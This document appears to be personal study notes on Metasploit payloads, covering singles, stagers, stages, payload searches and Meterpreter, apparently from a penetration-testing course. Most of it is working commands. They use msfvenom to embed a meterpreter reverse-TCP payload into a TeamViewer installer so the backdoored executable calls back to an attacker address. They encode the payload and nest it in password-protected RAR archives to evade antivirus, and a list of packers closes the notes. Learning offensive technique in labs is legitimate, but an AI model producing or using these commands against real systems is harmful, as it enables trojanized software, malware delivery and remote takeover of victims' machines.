
#### Singles
Exploit + entire shellcode
- Large
- Stable

#### Stagers
Waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host.
- Small
- Reliable

#### Stages
Downloaded by stager's modules


```shell-session
show payloads
```

```shell-session
grep meterpreter show payloads
```

```shell-session
grep meterpreter grep reverse_tcp show payloads
```

```shell-session
set payload 15
```

#### Meterpreter

```shell-session
help
```

Windows Payloads
![[Pasted image 20250302153634.png]]

Embed payloads into any executable file (backdoored executable):
```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
- -k = pull payload in a separate thread from the main application

#### Archiving (twice) the Payload
```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```
```shell-session
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
```
```shell-session
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
```
```shell-session
rar a ~/test.rar -p ~/test.js
```
```shell-session
mv test.rar test
```
```shell-session
rar a test2.rar -p test
```
```shell-session
mv test2.rar test2
```


#### Packing
- UPX packer	
- The Enigma Protector	
- MPRESS
- Alternate EXE Packer	
- ExeStealth	
- Morphine
- MEW	
- Themida	